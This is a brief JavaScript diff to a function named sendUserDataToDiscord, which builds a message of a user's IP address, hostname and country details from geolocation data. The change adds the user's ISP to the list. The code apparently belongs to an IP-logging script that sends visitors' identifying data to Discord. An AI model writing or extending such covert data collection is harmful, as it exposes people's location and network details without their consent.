@@ -18,6 +18,7 @@ async function sendUserDataToDiscord() {
     const messageContent = `
       **User Data:**
       - IP Address: ${geoData.ip}
+      - ISP: ${geoData.isp}
       - Hostname: ${geoData.hostname}
       - Country: ${geoData.country_name}
       - Country Code: ${geoData.country_code}
